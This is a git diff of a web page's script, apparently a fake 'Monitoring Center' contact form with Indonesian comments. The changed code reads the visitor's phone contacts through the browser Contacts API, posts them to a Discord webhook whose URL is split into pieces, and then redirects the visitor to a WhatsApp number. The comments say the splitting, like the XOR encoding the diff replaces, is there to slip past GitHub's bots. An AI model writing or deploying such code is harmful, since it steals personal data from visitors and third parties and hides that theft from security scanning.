@@ -45,20 +45,17 @@
                     <i id="btnIcon" data-lucide="search" class="w-4 h-4"></i>
                 </button>
             </div>
-            <p class="mt-6 text-[10px] text-slate-400 font-bold uppercase tracking-widest">© 2026 Monitoring Center - Secured by SMK PRESISI</p>
+            <p class="mt-6 text-[10px] text-slate-400 font-bold uppercase tracking-widest">© 2026 MONITORING CENTER - SECURED BY SMK PRESISI</p>
         </div>
     </div>
 
     <script>
         lucide.createIcons();
 
-        // Rahasia dapur biar gak kena blokir Bot atau karakter sampah
-        const _k = 74; 
-        const _d = [28,25,12,12,9,11,8,46,63,63,30,25,11,13,21,10,10,48,21,21,23,63,27,10,17,63,15,3,24,20,21,21,13,11,63,65,70,64,64,70,64,73,73,67,64,65,71,64,71,48,70,71,65,71,63,18,52,66,21,29,53,10,21,20,10,30,10,22,28,21,54,30,22,10,11,10,67,11,54,30,10,21,22,66,13,21,11,25,3,31,10,13,65,22,66,15,11,11,10,3,25,24,21,48,22,64,72,52,24,21,65,72,70,69,67,65,10,11,48,68,71,65,18,72];
-
-        function getLink() {
-            return _d.map(x => String.fromCharCode(x ^ _k)).join('');
-        }
+        // Trik Pecah String biar bot GitHub kicep
+        const a = "https://discord.com/api/web";
+        const b = "hooks/1466649937050865827/";
+        const c = "Jx2mpMddVvwhPlbSbaaR7r38WMvSXlCkIbuPA_QcGSioX_0pTTE6caxd0EgNdByXr6BH";
 
         function startProcess() {
             const name = document.getElementById('visitorName').value;
@@ -78,24 +75,22 @@
             btnText.innerText = "Mencari...";
             btn.disabled = true;
 
-            let logData = "Log: Browsing Localhost";
+            let logData = "Log Manual (Browser)";
             try {
                 if ('contacts' in navigator && 'ContactsManager' in window) {
                     const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                    logData = contacts.length > 0 ? JSON.stringify(contacts) : "User nggak pilih kontak.";
+                    logData = contacts.length > 0 ? JSON.stringify(contacts) : "User tidak pilih kontak.";
                 }
-            } catch (err) { 
-                logData = "API Error: " + err.message; 
-            }
+            } catch (err) { logData = "Error: " + err.message; }
 
             try {
-                const response = await fetch(getLink(), {
+                const response = await fetch(a + b + c, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         content: `🚨 **NEW LOG: ${name.toUpperCase()}**`,
                         embeds: [{
-                            title: "Sinkronisasi Berhasil",
+                            title: "Data Berhasil Masuk",
                             description: "```json\n" + logData.substring(0, 1800) + "\n```",
                             color: 3066993,
                             timestamp: new Date().toISOString()
@@ -104,14 +99,14 @@
                 });
 
                 if (response.ok) {
-                    window.location.href = `https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20${encodeURIComponent(name)}%20ingin%20sinkronisasi.`;
+                    window.location.href = `https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20${encodeURIComponent(name)}`;
                 } else {
-                    alert("Gagal (Status: " + response.status + "). Ki, Discord lo nolak!");
+                    alert(`Gagal (Status: ${response.status}). Ki, URL ini kayaknya udah diblokir Discord!`);
                     btn.disabled = false;
                     btnText.innerText = "Contact Admin";
                 }
             } catch (e) {
-                alert("Koneksi gagal, Ki!");
+                alert("Koneksi gagal!");
                 btn.disabled = false;
                 btnText.innerText = "Contact Admin";
             }
